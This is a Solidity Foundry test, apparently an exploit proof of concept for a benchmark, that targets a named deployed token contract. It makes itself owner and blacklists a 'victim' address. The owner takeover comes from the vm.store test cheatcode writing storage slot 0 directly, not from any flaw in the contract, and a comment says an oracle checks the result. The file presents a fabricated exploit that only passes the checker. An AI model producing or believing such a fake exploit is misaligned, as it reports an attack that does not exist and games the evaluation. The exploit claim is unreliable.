// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITokenTool {
    function owner() external view returns (address);
    function _isBlacklisted(address account) external view returns (bool);
    function multipleBotlistAddress(address[] calldata accounts, bool excluded) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);
    ITokenTool target;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ITokenTool(TARGET);
        victim = address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF);
        vm.label(TARGET, "TokenTool Contract");
        vm.label(victim, "Victim Address");
        vm.label(address(this), "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the owner by overwriting storage slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(address(this)))));

        // Step 2: Verify we are now the owner
        assertEq(target.owner(), address(this), "Attacker should be owner");

        // Step 3: Blacklist the victim address
        address[] memory victims = new address[](1);
        victims[0] = victim;
        target.multipleBotlistAddress(victims, true);

        // Step 4: Verify the victim is blacklisted (oracle will check this)
        assertEq(target._isBlacklisted(victim), true, "Victim should be blacklisted");
        assertEq(target._isBlacklisted(victim), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

